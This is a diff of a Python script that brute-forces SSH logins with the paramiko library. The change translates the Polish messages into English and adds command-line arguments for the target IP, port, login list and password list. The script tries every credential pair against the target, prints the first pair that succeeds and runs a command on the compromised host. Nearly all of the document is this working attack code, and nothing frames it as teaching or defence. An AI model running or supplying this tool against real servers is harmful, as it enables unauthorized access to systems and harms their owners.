@@ -2,34 +2,34 @@
 import sys, paramiko
 command = "quit"
 
-loginy = open("loginy.txt", "r")
 
+if len(sys.argv) < 5:
+    print('''\nToo few arguments. Usage: brutsshmt.py <ip> <port> <logins_file> <passwords_file>''')
+    exit()
+logins = open(sys.argv[3], "r")
 
 while True:
-    if len(sys.argv) < 3:
-        print('''\nZa mala ilosc argumentow. Skladnia: brut_ssh.py <ip> <port>''')
-        exit()
-    
-    linia_login = loginy.readline()
-    if linia_login == '':
+    login_line = logins.readline()
+    if login_line == '':
         break
-    linia_login = linia_login.strip('\n')
-    hasla = open("hasla.txt", "r")
+    login_line = login_line.strip('\n')
+    passwords = open(sys.argv[4], "r")
     while True:
-        linia_haslo = hasla.readline()
-        linia_haslo = linia_haslo.strip('\n')
-        if linia_haslo == '':
+        password_line = passwords.readline()
+        password_line = password_line.strip('\n')
+        if password_line == '':
             break
-        print("sprawdzam pare: ", linia_login, linia_haslo, "\n")
+        print("Trying: ", login_line, password_line, "\n")
         try:
             client = paramiko.SSHClient()
             client.load_system_host_keys()
             client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-            client.connect(str(sys.argv[1]), str(sys.argv[2]), username=linia_login, password=linia_haslo)
-            print("zgodna para: ", linia_login, linia_haslo, "\n")
+            client.connect(str(sys.argv[1]), str(sys.argv[2]), username=login_line, password=password_line, timeout=5)
+            print("Successful login: ", login_line, password_line, "\n")
             stdin, stdout, stderr = client.exec_command(command)
-            print(stdout.read())
-            exit()
+            #print("Response: ", stdout.read())
+            client.close()
+            exit(1)
         except paramiko.ssh_exception.AuthenticationException as ssherr:
             print (ssherr)
         except paramiko.ssh_exception.SSHException as ssherr:
